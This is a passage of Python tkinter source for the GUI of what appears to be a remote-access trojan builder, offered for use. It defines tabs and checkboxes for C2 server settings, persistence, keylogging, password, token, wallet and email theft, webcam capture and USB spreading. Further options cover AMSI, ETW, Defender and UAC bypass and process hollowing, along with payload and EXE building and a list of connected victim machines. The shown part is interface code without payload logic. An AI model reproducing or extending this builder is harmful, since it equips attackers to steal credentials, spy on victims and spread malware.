    def create_notebook(self):
        """Create notebook with tabs"""
        self.notebook = ttk.Notebook(self.main_container)
        self.notebook.grid(row=0, column=0, sticky="nsew", padx=5, pady=5)
        
        # Create tabs
        self.tabs = {}
        tab_names = [
            "Dashboard",
            "Basic Settings",
            "Features",
            "Evasion",
            "Stealth",
            "Network",
            "Payload",
            "Build",
            "Server Control",
            "Logs"
        ]
        
        for name in tab_names:
            frame = ttk.Frame(self.notebook)
            self.notebook.add(frame, text=name)
            self.tabs[name] = frame
        
        # Configure notebook style
        self.notebook.bind("<<NotebookTabChanged>>", self.on_tab_changed)
    
    def create_menu(self):
        """Create menu bar"""
        menubar = tk.Menu(self.root)
        self.root.config(menu=menubar)
        
        # File menu
        file_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="File", menu=file_menu)
        file_menu.add_command(label="New Configuration", command=self.new_config)
        file_menu.add_command(label="Load Configuration", command=self.load_config)
        file_menu.add_command(label="Save Configuration", command=self.save_config)
        file_menu.add_command(label="Save As...", command=self.save_config_as)
        file_menu.add_separator()
        file_menu.add_command(label="Export Config", command=self.export_config)
        file_menu.add_command(label="Import Config", command=self.import_config)
        file_menu.add_separator()
        file_menu.add_command(label="Exit", command=self.root.quit)
        
        # Edit menu
        edit_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="Edit", menu=edit_menu)
        edit_menu.add_command(label="Undo", command=self.undo)
        edit_menu.add_command(label="Redo", command=self.redo)
        edit_menu.add_separator()
        edit_menu.add_command(label="Copy", command=self.copy)
        edit_menu.add_command(label="Paste", command=self.paste)
        edit_menu.add_separator()
        edit_menu.add_command(label="Preferences", command=self.show_preferences)
        
        # Build menu
        build_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="Build", menu=build_menu)
        build_menu.add_command(label="Generate Payload", command=self.generate_payload)
        build_menu.add_command(label="Build EXE", command=self.build_exe)
        build_menu.add_command(label="Test Payload", command=self.test_payload)
        build_menu.add_separator()
        build_menu.add_command(label="Compile Options", command=self.show_compile_options)
        
        # Tools menu
        tools_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="Tools", menu=tools_menu)
        tools_menu.add_command(label="C2 Server", command=self.start_c2_server)
        tools_menu.add_command(label="Connection Test", command=self.test_connection)
        tools_menu.add_command(label="Obfuscation Test", command=self.test_obfuscation)
        tools_menu.add_separator()
        tools_menu.add_command(label="Icon Generator", command=self.generate_icon)
        tools_menu.add_command(label="Resource Editor", command=self.edit_resources)
        tools_menu.add_command(label="Payload Encoder", command=self.encode_payload)
        
        # View menu
        view_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="View", menu=view_menu)
        
        # Themes submenu
        theme_menu = tk.Menu(view_menu, tearoff=0)
        view_menu.add_cascade(label="Themes", menu=theme_menu)
        for theme in THEMES.keys():
            theme_menu.add_command(
                label=theme.title(),
                command=lambda t=theme: self.change_theme(t)
            )
        
        view_menu.add_separator()
        view_menu.add_checkbutton(label="Toolbar", command=self.toggle_toolbar)
        view_menu.add_checkbutton(label="Status Bar", command=self.toggle_status_bar)
        view_menu.add_separator()
        view_menu.add_command(label="Fullscreen", command=self.toggle_fullscreen)
        
        # Help menu
        help_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="Help", menu=help_menu)
        help_menu.add_command(label="Documentation", command=self.show_docs)
        help_menu.add_command(label="Tutorial", command=self.show_tutorial)
        help_menu.add_separator()
        help_menu.add_command(label="Check for Updates", command=self.check_updates)
        help_menu.add_command(label="About", command=self.show_about)
    
    def create_toolbar(self):
        """Create toolbar"""
        self.toolbar = ttk.Frame(self.main_container)
        self.toolbar.grid(row=1, column=0, sticky="ew", padx=5, pady=2)
        
        # Toolbar buttons
        buttons = [
            ("New", "üìÑ", self.new_config),
            ("Open", "üìÇ", self.load_config),
            ("Save", "üíæ", self.save_config),
            ("", "|", None),
            ("Generate", "‚öôÔ∏è", self.generate_payload),
            ("Build", "üî®", self.build_exe),
            ("Test", "üß™", self.test_payload),
            ("", "|", None),
            ("Server", "üåê", self.start_c2_server),
            ("Help", "‚ùì", self.show_docs)
        ]
        
        for text, icon, command in buttons:
            if text == "" and icon == "|":
                sep = ttk.Separator(self.toolbar, orient="vertical")
                sep.pack(side="left", padx=5, pady=2)
            else:
                btn = ttk.Button(
                    self.toolbar,
                    text=f"{icon} {text}" if text else icon,
                    command=command,
                    width=10 if text else 3
                )
                btn.pack(side="left", padx=2, pady=2)
    
    def create_status_bar(self):
        """Create status bar"""
        self.status_bar = ttk.Frame(self.main_container)
        self.status_bar.grid(row=2, column=0, sticky="ew", padx=5, pady=2)
        
        # Status labels
        self.status_text = tk.StringVar(value="Ready")
        status_label = ttk.Label(self.status_bar, textvariable=self.status_text)
        status_label.pack(side="left", padx=10)
        
        # Progress bar
        self.progress = ttk.Progressbar(self.status_bar, mode='determinate', length=100)
        self.progress.pack(side="right", padx=10, pady=2)
        
        # Version label
        version_label = ttk.Label(self.status_bar, text=f"v{VERSION}")
        version_label.pack(side="right", padx=10)
    
    def init_tab_contents(self):
        """Initialize tab contents"""
        # Dashboard tab
        self.init_dashboard()
        
        # Basic Settings tab
        self.init_basic_settings()
        
        # Features tab
        self.init_features()
        
        # Evasion tab
        self.init_evasion()
        
        # Stealth tab
        self.init_stealth()
        
        # Network tab
        self.init_network()
        
        # Payload tab
        self.init_payload()
        
        # Build tab
        self.init_build()
        
        # Server Control tab
        self.init_server_control()
        
        # Logs tab
        self.init_logs()
    
    def init_dashboard(self):
        """Initialize dashboard tab"""
        frame = self.tabs["Dashboard"]
        
        # Welcome label
        welcome = ttk.Label(
            frame,
            text=f"Welcome to {APP_NAME}",
            font=("Segoe UI", 24, "bold")
        )
        welcome.pack(pady=20)
        
        # Stats frame
        stats_frame = ttk.LabelFrame(frame, text="Quick Stats", padding=20)
        stats_frame.pack(fill="x", padx=20, pady=10)
        
        stats = [
            ("Active Features", len([f for f in self.config_manager.config.features.values() if f])),
            ("Evasion Techniques", len([e for e in self.config_manager.config.evasion.values() if e])),
            ("Stealth Options", len([s for s in self.config_manager.config.stealth.values() if s])),
            ("Payload Size", "0 KB")
        ]
        
        for name, value in stats:
            stat_frame = ttk.Frame(stats_frame)
            stat_frame.pack(side="left", padx=20)
            ttk.Label(stat_frame, text=name, font=("Segoe UI", 10)).pack()
            ttk.Label(stat_frame, text=str(value), font=("Segoe UI", 16, "bold")).pack()
        
        # Quick actions
        actions_frame = ttk.LabelFrame(frame, text="Quick Actions", padding=20)
        actions_frame.pack(fill="x", padx=20, pady=10)
        
        actions = [
            ("Generate Payload", self.generate_payload),
            ("Build EXE", self.build_exe),
            ("Start C2 Server", self.start_c2_server),
            ("Test Connection", self.test_connection)
        ]
        
        for text, command in actions:
            btn = ttk.Button(actions_frame, text=text, command=command, width=20)
            btn.pack(side="left", padx=10, pady=5)
    
    def init_basic_settings(self):
        """Initialize basic settings tab"""
        frame = self.tabs["Basic Settings"]
        
        # C2 Settings
        c2_frame = ttk.LabelFrame(frame, text="C2 Server Settings", padding=10)
        c2_frame.pack(fill="x", padx=10, pady=5)
        
        ttk.Label(c2_frame, text="C2 IP/Host:").grid(row=0, column=0, sticky="w", pady=5, padx=5)
        self.c2_ip = ttk.Entry(c2_frame, width=30)
        self.c2_ip.grid(row=0, column=1, sticky="w", pady=5, padx=5)
        self.c2_ip.insert(0, self.config_manager.config.c2_ip)
        
        ttk.Label(c2_frame, text="Port:").grid(row=0, column=2, sticky="w", pady=5, padx=5)
        self.c2_port = ttk.Entry(c2_frame, width=10)
        self.c2_port.grid(row=0, column=3, sticky="w", pady=5, padx=5)
        self.c2_port.insert(0, str(self.config_manager.config.c2_port))
        
        ttk.Label(c2_frame, text="Protocol:").grid(row=1, column=0, sticky="w", pady=5, padx=5)
        self.protocol = ttk.Combobox(c2_frame, values=["tcp", "udp", "http", "https"], width=10)
        self.protocol.grid(row=1, column=1, sticky="w", pady=5, padx=5)
        self.protocol.set(self.config_manager.config.protocol)
        
        # Installation Settings
        install_frame = ttk.LabelFrame(frame, text="Installation Settings", padding=10)
        install_frame.pack(fill="x", padx=10, pady=5)
        
        ttk.Label(install_frame, text="Install Name:").grid(row=0, column=0, sticky="w", pady=5, padx=5)
        self.install_name = ttk.Entry(install_frame, width=30)
        self.install_name.grid(row=0, column=1, columnspan=3, sticky="w", pady=5, padx=5)
        self.install_name.insert(0, self.config_manager.config.install_name)
        
        ttk.Label(install_frame, text="Install Path:").grid(row=1, column=0, sticky="w", pady=5, padx=5)
        self.install_path = ttk.Entry(install_frame, width=30)
        self.install_path.grid(row=1, column=1, sticky="w", pady=5, padx=5)
        self.install_path.insert(0, self.config_manager.config.install_path)
        
        ttk.Button(install_frame, text="Browse", command=self.browse_install_path).grid(row=1, column=2, padx=5)
        
        # Common paths
        common_paths = ttk.Combobox(install_frame, values=[
            "%APPDATA%\\Microsoft\\Windows",
            "%TEMP%",
            "%PROGRAMDATA%",
            "%USERPROFILE%",
            "C:\\Windows\\System32"
        ], width=20)
        common_paths.grid(row=1, column=3, padx=5)
        common_paths.bind("<<ComboboxSelected>>", lambda e: self.install_path.delete(0, tk.END) or self.install_path.insert(0, common_paths.get()))
        
        ttk.Label(install_frame, text="Startup Name:").grid(row=2, column=0, sticky="w", pady=5, padx=5)
        self.startup_name = ttk.Entry(install_frame, width=30)
        self.startup_name.grid(row=2, column=1, sticky="w", pady=5, padx=5)
        self.startup_name.insert(0, self.config_manager.config.startup_name)
        
        ttk.Label(install_frame, text="Mutex Name:").grid(row=3, column=0, sticky="w", pady=5, padx=5)
        self.mutex_name = ttk.Entry(install_frame, width=30)
        self.mutex_name.grid(row=3, column=1, sticky="w", pady=5, padx=5)
        self.mutex_name.insert(0, self.config_manager.config.mutex_name)
    
    def init_features(self):
        """Initialize features tab"""
        frame = self.tabs["Features"]
        
        # Create scrollable frame
        canvas = tk.Canvas(frame)
        scrollbar = ttk.Scrollbar(frame, orient="vertical", command=canvas.yview)
        scrollable_frame = ttk.Frame(canvas)
        
        scrollable_frame.bind(
            "<Configure>",
            lambda e: canvas.configure(scrollregion=canvas.bbox("all"))
        )
        
        canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
        canvas.configure(yscrollcommand=scrollbar.set)
        
        canvas.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")
        
        # Features grid
        features = [
            ("Keylogger", "keylogger", "Capture keystrokes"),
            ("Screenshot", "screenshot", "Take screenshots remotely"),
            ("File Explorer", "file_explorer", "Browse filesystem"),
            ("Remote Shell", "remote_shell", "Execute commands"),
            ("Process Manager", "process_manager", "Manage processes"),
            ("Audio Capture", "audio_capture", "Record microphone"),
            ("Webcam Capture", "webcam_capture", "Capture webcam"),
            ("Clipboard Monitor", "clipboard_monitor", "Monitor clipboard"),
            ("Password Stealer", "password_stealer", "Steal saved passwords"),
            ("Browser History", "browser_history", "Get browser history"),
            ("Network Scanner", "network_scanner", "Scan network"),
            ("USB Spreader", "usb_spreader", "Spread via USB"),
            ("Discord Token", "discord_token", "Steal Discord tokens"),
            ("Crypto Wallet", "crypto_wallet", "Steal crypto wallets"),
            ("Email Stealer", "email_stealer", "Steal email credentials"),
            ("System Info", "system_info", "Collect system information"),
            ("Persistence", "persistence", "Maintain access after reboot")
        ]
        
        self.feature_vars = {}
        
        for i, (name, key, desc) in enumerate(features):
            var = tk.BooleanVar(value=self.config_manager.config.features.get(key, False))
            self.feature_vars[key] = var
            
            frame_feature = ttk.Frame(scrollable_frame)
            frame_feature.pack(fill="x", padx=20, pady=5)
            
            cb = ttk.Checkbutton(frame_feature, text=name, variable=var)
            cb.pack(side="left")
            
            ttk.Label(frame_feature, text=desc, font=("Segoe UI", 9), foreground="gray").pack(side="left", padx=10)
    
    def init_evasion(self):
        """Initialize evasion techniques tab"""
        frame = self.tabs["Evasion"]
        
        canvas = tk.Canvas(frame)
        scrollbar = ttk.Scrollbar(frame, orient="vertical", command=canvas.yview)
        scrollable_frame = ttk.Frame(canvas)
        
        scrollable_frame.bind("<Configure>", lambda e: canvas.configure(scrollregion=canvas.bbox("all")))
        canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
        canvas.configure(yscrollcommand=scrollbar.set)
        
        canvas.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")
        
        # Evasion techniques
        techniques = [
            ("Obfuscate Code", "obfuscate_code", "Make code hard to analyze"),
            ("Encrypt Strings", "encrypt_strings", "Encrypt all strings"),
            ("Anti-VM Detection", "anti_vm", "Detect virtual machines"),
            ("Anti-Debug Detection", "anti_debug", "Detect debuggers"),
            ("Sleep Obfuscation", "sleep_obfuscation", "Hide sleep patterns"),
            ("Process Injection", "process_injection", "Inject into legit processes"),
            ("Code Polymorphism", "code_polymorphism", "Change code each generation"),
            ("Sandbox Evasion", "sandbox_evasion", "Evade sandbox analysis"),
            ("AMSI Bypass", "amsi_bypass", "Bypass AMSI (Windows)"),
            ("ETW Bypass", "etw_bypass", "Bypass ETW (Windows)"),
            ("Heap Encryption", "heap_encryption", "Encrypt heap memory"),
            ("API Hashing", "api_hashing", "Hide API calls"),
            ("Module Stomping", "module_stomping", "Hide loaded modules"),
            ("Thread Hijacking", "thread_hijacking", "Hijack existing threads"),
            ("Process Hollowing", "process_hollowing", "Hollow legit processes")
        ]
        
        self.evasion_vars = {}
        
        for i, (name, key, desc) in enumerate(techniques):
            var = tk.BooleanVar(value=self.config_manager.config.evasion.get(key, False))
            self.evasion_vars[key] = var
            
            frame_tech = ttk.Frame(scrollable_frame)
            frame_tech.pack(fill="x", padx=20, pady=5)
            
            cb = ttk.Checkbutton(frame_tech, text=name, variable=var)
            cb.pack(side="left")
            
            ttk.Label(frame_tech, text=desc, font=("Segoe UI", 9), foreground="gray").pack(side="left", padx=10)
    
    def init_stealth(self):
        """Initialize stealth options tab"""
        frame = self.tabs["Stealth"]
        
        canvas = tk.Canvas(frame)
        scrollbar = ttk.Scrollbar(frame, orient="vertical", command=canvas.yview)
        scrollable_frame = ttk.Frame(canvas)
        
        scrollable_frame.bind("<Configure>", lambda e: canvas.configure(scrollregion=canvas.bbox("all")))
        canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
        canvas.configure(yscrollcommand=scrollbar.set)
        
        canvas.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")
        
        # Stealth options
        options = [
            ("Hide File", "file_hidden", "Set file as hidden"),
            ("Hide Process", "process_hidden", "Hide from task manager"),
            ("Hide Network", "network_hidden", "Hide network connections"),
            ("Delete Original", "delete_original", "Delete original after install"),
            ("Clean Logs", "clean_logs", "Clean execution logs"),
            ("Fake Error", "fake_error", "Show fake error on startup"),
            ("Mutex Check", "mutex_check", "Prevent multiple instances"),
            ("UAC Bypass", "uac_bypass", "Bypass UAC (requires admin)"),
            ("Windows Defender Bypass", "defender_bypass", "Bypass Windows Defender"),
            ("Firewall Bypass", "firewall_bypass", "Add firewall exception"),
            ("Signature Spoofing", "signature_spoof", "Spoof file signature"),
            ("Time Stomping", "time_stomp", "Fake file timestamps"),
            ("Process Name Spoof", "process_spoof", "Spoof process name"),
            ("Parent PID Spoof", "parent_spoof", "Spoof parent process"),
            ("Module Load Obfuscation", "module_obfuscate", "Obfuscate module loading")
        ]
        
        self.stealth_vars = {}
        
        for i, (name, key, desc) in enumerate(options):
            var = tk.BooleanVar(value=self.config_manager.config.stealth.get(key, False))
            self.stealth_vars[key] = var
            
            frame_opt = ttk.Frame(scrollable_frame)
            frame_opt.pack(fill="x", padx=20, pady=5)
            
            cb = ttk.Checkbutton(frame_opt, text=name, variable=var)
            cb.pack(side="left")
            
            ttk.Label(frame_opt, text=desc, font=("Segoe UI", 9), foreground="gray").pack(side="left", padx=10)
    
    def init_network(self):
        """Initialize network settings tab"""
        frame = self.tabs["Network"]
        
        # Network settings frame
        net_frame = ttk.LabelFrame(frame, text="Network Settings", padding=10)
        net_frame.pack(fill="x", padx=10, pady=5)
        
        ttk.Label(net_frame, text="Reconnect Interval (sec):").grid(row=0, column=0, sticky="w", pady=5, padx=5)
        self.reconnect_interval = ttk.Entry(net_frame, width=10)
        self.reconnect_interval.grid(row=0, column=1, sticky="w", pady=5, padx=5)
        self.reconnect_interval.insert(0, str(self.config_manager.config.network["reconnect_interval"]))
        
        ttk.Label(net_frame, text="Timeout (sec):").grid(row=0, column=2, sticky="w", pady=5, padx=5)
        self.timeout = ttk.Entry(net_frame, width=10)
        self.timeout.grid(row=0, column=3, sticky="w", pady=5, padx=5)
        self.timeout.insert(0, str(self.config_manager.config.network["timeout"]))
        
        ttk.Label(net_frame, text="Retry Count:").grid(row=1, column=0, sticky="w", pady=5, padx=5)
        self.retry_count = ttk.Entry(net_frame, width=10)
        self.retry_count.grid(row=1, column=1, sticky="w", pady=5, padx=5)
        self.retry_count.insert(0, str(self.config_manager.config.network["retry_count"]))
        
        # Protocol options
        proto_frame = ttk.LabelFrame(frame, text="Protocol Options", padding=10)
        proto_frame.pack(fill="x", padx=10, pady=5)
        
        self.use_https = tk.BooleanVar(value=self.config_manager.config.network["use_https"])
        self.use_dns = tk.BooleanVar(value=self.config_manager.config.network["use_dns"])
        self.use_tor = tk.BooleanVar(value=self.config_manager.config.network["use_tor"])
        self.use_proxy = tk.BooleanVar(value=self.config_manager.config.network["use_proxy"])
        
        ttk.Checkbutton(proto_frame, text="Use HTTPS", variable=self.use_https).grid(row=0, column=0, sticky="w", pady=5, padx=5)
        ttk.Checkbutton(proto_frame, text="Use DNS Tunneling", variable=self.use_dns).grid(row=0, column=1, sticky="w", pady=5, padx=5)
        ttk.Checkbutton(proto_frame, text="Use Tor Proxy", variable=self.use_tor).grid(row=1, column=0, sticky="w", pady=5, padx=5)
        ttk.Checkbutton(proto_frame, text="Use Proxy", variable=self.use_proxy).grid(row=1, column=1, sticky="w", pady=5, padx=5)
        
        # Proxy settings
        proxy_frame = ttk.LabelFrame(frame, text="Proxy Settings", padding=10)
        proxy_frame.pack(fill="x", padx=10, pady=5)
        
        ttk.Label(proxy_frame, text="Proxy Host:").grid(row=0, column=0, sticky="w", pady=5, padx=5)
        self.proxy_host = ttk.Entry(proxy_frame, width=30)
        self.proxy_host.grid(row=0, column=1, sticky="w", pady=5, padx=5)
        self.proxy_host.insert(0, self.config_manager.config.network["proxy_host"])
        
        ttk.Label(proxy_frame, text="Proxy Port:").grid(row=0, column=2, sticky="w", pady=5, padx=5)
        self.proxy_port = ttk.Entry(proxy_frame, width=10)
        self.proxy_port.grid(row=0, column=3, sticky="w", pady=5, padx=5)
        self.proxy_port.insert(0, str(self.config_manager.config.network["proxy_port"]))
        
        # User Agent
        ua_frame = ttk.LabelFrame(frame, text="User Agent", padding=10)
        ua_frame.pack(fill="x", padx=10, pady=5)
        
        self.user_agent = tk.Text(ua_frame, height=3, width=80)
        self.user_agent.pack(fill="x", padx=5, pady=5)
        self.user_agent.insert("1.0", self.config_manager.config.network["user_agent"])
    
    def init_payload(self):
        """Initialize payload options tab"""
        frame = self.tabs["Payload"]
        
        # Payload type
        type_frame = ttk.LabelFrame(frame, text="Payload Type", padding=10)
        type_frame.pack(fill="x", padx=10, pady=5)
        
        ttk.Label(type_frame, text="Type:").grid(row=0, column=0, sticky="w", pady=5, padx=5)
        self.payload_type = ttk.Combobox(type_frame, values=["stub", "dropper", "binder", "downloader"], width=15)
        self.payload_type.grid(row=0, column=1, sticky="w", pady=5, padx=5)
        self.payload_type.set(self.config_manager.config.payload["type"])
        
        ttk.Label(type_frame, text="Method:").grid(row=0, column=2, sticky="w", pady=5, padx=5)
        self.payload_method = ttk.Combobox(type_frame, values=["standard", "reflective", "process"], width=15)
        self.payload_method.grid(row=0, column=3, sticky="w", pady=5, padx=5)
        self.payload_method.set(self.config_manager.config.payload["method"])
        
        # Injection target
        ttk.Label(type_frame, text="Injection Target:").grid(row=1, column=0, sticky="w", pady=5, padx=5)
        self.injection_target = ttk.Entry(type_frame, width=20)
        self.injection_target.grid(row=1, column=1, sticky="w", pady=5, padx=5)
        self.injection_target.insert(0, self.config_manager.config.payload["injection_target"])
        
        # Advanced options
        adv_frame = ttk.LabelFrame(frame, text="Advanced Options", padding=10)
        adv_frame.pack(fill="x", padx=10, pady=5)
        
        ttk.Label(adv_frame, text="Encryption Key:").grid(row=0, column=0, sticky="w", pady=5, padx=5)
        self.encryption_key = ttk.Entry(adv_frame, width=40)
        self.encryption_key.grid(row=0, column=1, sticky="w", pady=5, padx=5)
        self.encryption_key.insert(0, self.config_manager.config.advanced["encryption_key"])
        
        ttk.Button(adv_frame, text="Generate", command=self.generate_key).grid(row=0, column=2, padx=5)
        
        ttk.Label(adv_frame, text="Compression Level (0-9):").grid(row=1, column=0, sticky="w", pady=5, padx=5)
        self.compression_level = ttk.Scale(adv_frame, from_=0, to=9, orient="horizontal")
        self.compression_level.set(self.config_manager.config.advanced["compression_level"])
        self.compression_level.grid(row=1, column=1, sticky="ew", pady=5, padx=5)
        
        ttk.Label(adv_frame, text="Obfuscation Level (1-5):").grid(row=2, column=0, sticky="w", pady=5, padx=5)
        self.obfuscation_level = ttk.Scale(adv_frame, from_=1, to=5, orient="horizontal")
        self.obfuscation_level.set(self.config_manager.config.advanced["obfuscation_level"])
        self.obfuscation_level.grid(row=2, column=1, sticky="ew", pady=5, padx=5)
        
        # Icon settings
        icon_frame = ttk.LabelFrame(frame, text="Icon Settings", padding=10)
        icon_frame.pack(fill="x", padx=10, pady=5)
        
        ttk.Label(icon_frame, text="Icon File:").grid(row=0, column=0, sticky="w", pady=5, padx=5)
        self.icon_file = ttk.Entry(icon_frame, width=40)
        self.icon_file.grid(row=0, column=1, sticky="w", pady=5, padx=5)
        self.icon_file.insert(0, self.config_manager.config.advanced["icon_file"])
        
        ttk.Button(icon_frame, text="Browse", command=self.browse_icon).grid(row=0, column=2, padx=5)
        ttk.Button(icon_frame, text="Generate Icon", command=self.generate_icon).grid(row=0, column=3, padx=5)
        
        # Architecture
        arch_frame = ttk.LabelFrame(frame, text="Architecture", padding=10)
        arch_frame.pack(fill="x", padx=10, pady=5)
        
        self.architecture = tk.StringVar(value=self.config_manager.config.advanced["architecture"])
        ttk.Radiobutton(arch_frame, text="x86 (32-bit)", variable=self.architecture, value="x86").pack(side="left", padx=20)
        ttk.Radiobutton(arch_frame, text="x64 (64-bit)", variable=self.architecture, value="x64").pack(side="left", padx=20)
        ttk.Radiobutton(arch_frame, text="Both", variable=self.architecture, value="both").pack(side="left", padx=20)
    
    def init_build(self):
        """Initialize build tab"""
        frame = self.tabs["Build"]
        
        # Output settings
        output_frame = ttk.LabelFrame(frame, text="Output Settings", padding=10)
        output_frame.pack(fill="x", padx=10, pady=5)
        
        ttk.Label(output_frame, text="Output Directory:").grid(row=0, column=0, sticky="w", pady=5, padx=5)
        self.output_dir = ttk.Entry(output_frame, width=40)
        self.output_dir.grid(row=0, column=1, sticky="w", pady=5, padx=5)
        self.output_dir.insert(0, os.path.join(os.getcwd(), "output"))
        
        ttk.Button(output_frame, text="Browse", command=self.browse_output).grid(row=0, column=2, padx=5)
        
        ttk.Label(output_frame, text="Output Name:").grid(row=1, column=0, sticky="w", pady=5, padx=5)
        self.output_name = ttk.Entry(output_frame, width=30)
        self.output_name.grid(row=1, column=1, sticky="w", pady=5, padx=5)
        self.output_name.insert(0, "payload")
        
        # Build options
        build_frame = ttk.LabelFrame(frame, text="Build Options", padding=10)
        build_frame.pack(fill="x", padx=10, pady=5)
        
        self.upx_pack = tk.BooleanVar(value=self.config_manager.config.advanced["upx_pack"])
        self.anti_analysis = tk.BooleanVar(value=self.config_manager.config.advanced["anti_analysis"])
        self.junk_code = tk.BooleanVar(value=self.config_manager.config.payload["junk_code"])
        
        ttk.Checkbutton(build_frame, text="UPX Packing", variable=self.upx_pack).grid(row=0, column=0, sticky="w", pady=5, padx=5)
        ttk.Checkbutton(build_frame, text="Anti-Analysis", variable=self.anti_analysis).grid(row=0, column=1, sticky="w", pady=5, padx=5)
        ttk.Checkbutton(build_frame, text="Add Junk Code", variable=self.junk_code).grid(row=0, column=2, sticky="w", pady=5, padx=5)
        
        # Build buttons
        button_frame = ttk.Frame(frame)
        button_frame.pack(fill="x", padx=10, pady=20)
        
        ttk.Button(button_frame, text="Generate Payload", command=self.generate_payload, width=20).pack(side="left", padx=10)
        ttk.Button(button_frame, text="Build EXE", command=self.build_exe, width=20).pack(side="left", padx=10)
        ttk.Button(button_frame, text="Test Payload", command=self.test_payload, width=20).pack(side="left", padx=10)
        ttk.Button(button_frame, text="Clean Build", command=self.clean_build, width=20).pack(side="left", padx=10)
        
        # Log area
        log_frame = ttk.LabelFrame(frame, text="Build Log", padding=10)
        log_frame.pack(fill="both", expand=True, padx=10, pady=5)
        
        self.build_log = scrolledtext.ScrolledText(log_frame, height=15)
        self.build_log.pack(fill="both", expand=True, padx=5, pady=5)
        
        ttk.Button(log_frame, text="Clear Log", command=lambda: self.build_log.delete("1.0", tk.END)).pack(anchor="e", pady=5)
    
    def init_server_control(self):
        """Initialize server control tab"""
        frame = self.tabs["Server Control"]
        
        # Server configuration
        config_frame = ttk.LabelFrame(frame, text="Server Configuration", padding=10)
        config_frame.pack(fill="x", padx=10, pady=5)
        
        ttk.Label(config_frame, text="Bind IP:").grid(row=0, column=0, sticky="w", pady=5, padx=5)
        self.server_ip = ttk.Entry(config_frame, width=20)
        self.server_ip.grid(row=0, column=1, sticky="w", pady=5, padx=5)
        self.server_ip.insert(0, "0.0.0.0")
        
        ttk.Label(config_frame, text="Port:").grid(row=0, column=2, sticky="w", pady=5, padx=20)
        self.server_port = ttk.Entry(config_frame, width=10)
        self.server_port.grid(row=0, column=3, sticky="w", pady=5, padx=5)
        self.server_port.insert(0, "8080")
        
        ttk.Label(config_frame, text="Protocol:").grid(row=1, column=0, sticky="w", pady=5, padx=5)
        self.server_protocol = ttk.Combobox(config_frame, values=["TCP", "UDP"], width=10)
        self.server_protocol.grid(row=1, column=1, sticky="w", pady=5, padx=5)
        self.server_protocol.set("TCP")
        
        # Server control buttons
        control_frame = ttk.LabelFrame(frame, text="Server Control", padding=10)
        control_frame.pack(fill="x", padx=10, pady=10)
        
        self.start_btn = ttk.Button(control_frame, text="Start Server", command=self.start_c2_server, width=15)
        self.start_btn.pack(side="left", padx=10)
        
        self.stop_btn = ttk.Button(control_frame, text="Stop Server", command=self.stop_c2_server, width=15, state="disabled")
        self.stop_btn.pack(side="left", padx=10)
        
        self.restart_btn = ttk.Button(control_frame, text="Restart Server", command=self.restart_c2_server, width=15, state="disabled")
        self.restart_btn.pack(side="left", padx=10)
        
        # Status display
        status_frame = ttk.LabelFrame(frame, text="Server Status", padding=10)
        status_frame.pack(fill="x", padx=10, pady=5)
        
        self.server_status = tk.StringVar(value="Server: STOPPED")
        ttk.Label(status_frame, textvariable=self.server_status, font=("Segoe UI", 10, "bold")).pack(anchor="w")
        
        self.clients_connected = tk.StringVar(value="Connected Clients: 0")
        ttk.Label(status_frame, textvariable=self.clients_connected).pack(anchor="w")
        
        # Client list
        list_frame = ttk.LabelFrame(frame, text="Connected Clients", padding=10)
        list_frame.pack(fill="both", expand=True, padx=10, pady=5)
        
        columns = ("ID", "Hostname", "User", "IP", "System", "Last Active")
        self.client_tree = ttk.Treeview(list_frame, columns=columns, show="headings", height=8)
        
        for col in columns:
            self.client_tree.heading(col, text=col)
            self.client_tree.column(col, width=100)
        
        scrollbar = ttk.Scrollbar(list_frame, orient="vertical", command=self.client_tree.yview)
        self.client_tree.configure(yscrollcommand=scrollbar.set)
        
        self.client_tree.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")
    
    def init_logs(self):
        """Initialize logs tab"""
        frame = self.tabs["Logs"]
        
        # Log text area
        self.log_text = scrolledtext.ScrolledText(frame, wrap=tk.WORD, height=25)
        self.log_text.pack(fill="both", expand=True, padx=10, pady=10)
        
        # Log controls
        control_frame = ttk.Frame(frame)
        control_frame.pack(fill="x", padx=10, pady=5)
        
        ttk.Button(control_frame, text="Clear Logs", command=self.clear_logs).pack(side="left", padx=5)
        ttk.Button(control_frame, text="Save Logs", command=self.save_logs).pack(side="left", padx=5)
        ttk.Button(control_frame, text="Copy Logs", command=self.copy_logs).pack(side="left", padx=5)
        
        # Log level
        ttk.Label(control_frame, text="Log Level:").pack(side="left", padx=20)
        self.log_level = ttk.Combobox(control_frame, values=["DEBUG", "INFO", "WARNING", "ERROR"], width=10)
        self.log_level.pack(side="left", padx=5)
        self.log_level.set("INFO")
    
    def apply_theme(self):
        """Apply current theme"""
        self.theme_engine.apply_theme(self.root)
    
    def center_window(self):
        """Center the window on screen"""
        self.root.update_idletasks()
        width = self.root.winfo_width()
        height = self.root.winfo_height()
        x = (self.root.winfo_screenwidth() // 2) - (width // 2)
        y = (self.root.winfo_screenheight() // 2) - (height // 2)
        self.root.geometry(f"{width}x{height}+{x}+{y}")
    
    def initial_animations(self):
        """Run initial animations"""
        AnimationEngine.fade_in(self.root, duration=500)
    
    def on_tab_changed(self, event):
        """Handle tab change"""
        current = self.notebook.tab(self.notebook.select(), "text")
        self.status_text.set(f"Current tab: {current}")
    
    # ============================================================================
    # EVENT HANDLERS
    # ============================================================================
    
    def browse_install_path(self):
        """Browse for install path"""
        path = filedialog.askdirectory()
        if path:
            self.install_path.delete(0, tk.END)
            self.install_path.insert(0, path)
    
    def browse_output(self):
        """Browse for output directory"""
        path = filedialog.askdirectory()
        if path:
            self.output_dir.delete(0, tk.END)
            self.output_dir.insert(0, path)
    
    def browse_icon(self):
        """Browse for icon file"""
        filetypes = [("Icon files", "*.ico"), ("All files", "*.*")]
        path = filedialog.askopenfilename(filetypes=filetypes)
        if path:
            self.icon_file.delete(0, tk.END)
